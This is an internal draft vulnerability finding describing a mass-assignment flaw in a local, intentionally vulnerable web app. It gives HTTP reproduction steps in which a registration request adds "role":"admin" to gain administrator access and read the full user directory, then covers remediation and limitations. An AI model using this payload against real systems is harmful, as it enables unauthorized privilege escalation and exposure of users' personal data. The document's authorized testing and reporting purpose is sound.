# Draft Finding — Mass Assignment Enables Administrative Privilege Escalation

- **Status:** DRAFT for internal review — **not** a HackerOne submission.
- **Based on evidence in:** `evidence/testing/04-mass-assignment-registration.md` and `evidence/testing/05-mass-assignment-verification.md`.
- **Target of assessment:** a locally hosted, intentionally vulnerable web application reached at `http://localhost:3000`. Reasoning below is kept generic to the vulnerability class rather than to any specific product.

---

## Vulnerability class

- **Mass Assignment** (a.k.a. auto-binding / bulk parameter binding / object injection) — CWE-915 *Improperly Controlled Modification of Dynamically-Determined Object Attributes*.
- Resulting secondary condition: **Broken Object Property Level Authorization** (OWASP API Security - #6 Mass Assignment) and **Privilege Escalation** (CWE-269) — an unprivileged user becomes an administrator.

---

## Severity reasoning

- **High.**
- Attack prerequisites are minimal: an unauthenticated attacker reaching the self-registration API; no special knowledge beyond the name of a single sensitive attribute (`role`).
- Impact is substantial: a fully unprivileged actor can create an account that exercises administrator-level authorization, including reading the complete user directory (personal data of all users). This is a direct confidentiality and authorization failure.
- Not rated Critical because the demonstrated impact is scoped to application authorization (no host/OS compromise was demonstrated, and no destruction or lateral movement was observed).

---

## Affected functionality

- The **unauthenticated account self-registration** API surface.
- The registration handler binds client-supplied fields onto a user record; the resulting `role` value is stored and **honored by the runtime authorization layer**, which then grants access to administrator-gated functionality.

---

## Preconditions

- Attacker can send an HTTP POST to the self-registration endpoint (no authentication required).
- Attacker supplies the normally-required registration fields plus one additional, unspecified `role` attribute.
- The server does not whitelist acceptable input fields and does not force a default low-privilege role for self-registered accounts.

---

## Reproduction steps

1. Retrieve a valid value for the required security-question field (read-only enumeration of the security-question directory).
2. Submit a registration request including the required fields **and an extra `role` attribute set to `admin`**:
   ```
   POST /api/Users
   Content-Type: application/json
   {"email":"mma_probe@test.local","password":"JU1ceTesTPa$$",
    "passwordRepeat":"JU1ceTesTPa$$","securityQuestion":1,
    "securityAnswer":"probe","role":"admin"}
   ```
   Response: `HTTP/1.1 201 Created`, `Location: /api/Users/25`, body including `"role":"admin"` for the created record.
3. Log in with the created account:
   ```
   POST /rest/user/login
   {"email":"mma_probe@test.local","password":"JU1ceTesTPa$$"}
   ```
   Response: `200 OK`, a bearer token whose payload carries `"role":"admin"`.
4. Present that token to an administrator-gated resource:
   ```
   GET /api/Users
   Authorization: Bearer <token from step 3>
   ```
   Response: `200 OK` returning the full user directory, including all seed administrator accounts and the attacker's own account.
---

## Evidence

- **Persistence of the injected attribute:** the registration response echoed the attacker-supplied `role:"admin"` on the newly created record (`POST /api/Users`, HTTP 201, id 25, `mma_probe@test.local`).
- **Role carried into the session token:** authentication of that account issued a JWT whose payload `data` contained `"role":"admin"`, `"id":25`, `"isActive":true`.
- **Administrator authorization granted:** using that token, the account successfully read the full user directory (`GET /api/Users`, HTTP 200, Content-Length 6905) — an administrator-gated operation — returning all user accounts including multiple pre-existing administrator records.

Together these satisfy the chain: *registers with injected role → role stored → admin role in token → admin-gated data access*.

---

## Demonstrated impact

- An unauthenticated attacker can manufacture an account that holds **effective administrator authorization**.
- Demonstrated capability: read the entire user directory (all users' emails, roles, profile data, etc.), i.e., personal data of every account.
- Logical extension (not individually re-verified): any other operation the administrator role gates would also become reachable to this attacker-supplied account.

---

## Likely root cause — **UNVERIFIED (inferred)**

- The registration handler binds request-body properties directly onto the user model without an explicit allowlist, and does not default/force the `role` for self-registration, so a client-supplied `role` is persisted.
- The authorization layer derives privilege from that stored `role`, so the client-controlled value becomes authoritative for access control.
- **This is an inference from observed behavior; no server-side source code was inspected to confirm the exact binding implementation.**

---

## Remediation

- **Whitelist (allowlist) accepted registration fields** — bind only the explicitly permitted attributes (e.g., email, password) from the request, and reject or ignore any unexpected fields (drop or 400 on unknown keys).
- **Never accept trust/authorization attributes from the client.** Force a low-privilege/default `role` server-side at creation time regardless of any submitted value.
- **Separate request DTOs from internal models** (no auto-binding of a model).
- **Re-assert authorization server-side** from a trusted source (e.g., server DB lookup) rather than trusting embedded token claims alone, so tampered roles do not translate to privilege.
- **Add regression tests** asserting that accounts created via self-registration always land in the default, unprivileged role.

---

## Limitations

- **No control test:** we did not verify that a normal `customer` token is rejected (`401/403`) on the same `/api/Users` endpoint. The administrator-gated nature of that endpoint is assumed from the application's design; a control would strengthen the claim.
- **Scope of elevated powers not enumerated:** only user-directory listing was demonstrated; the full set of administrator-gated operations was not mapped (no further requests were performed).
- **Root cause unverified:** based on black-box observation only; server-side code was not inspected.
- **Field scope limited:** only the `role` attribute was injected; whether other sensitive attributes are also client-assignable was not tested.
- **Environment:** evidence is from the authorized local lab only; no external systems were involved. This is a draft for internal review and has **not** been submitted to any bug-bounty program.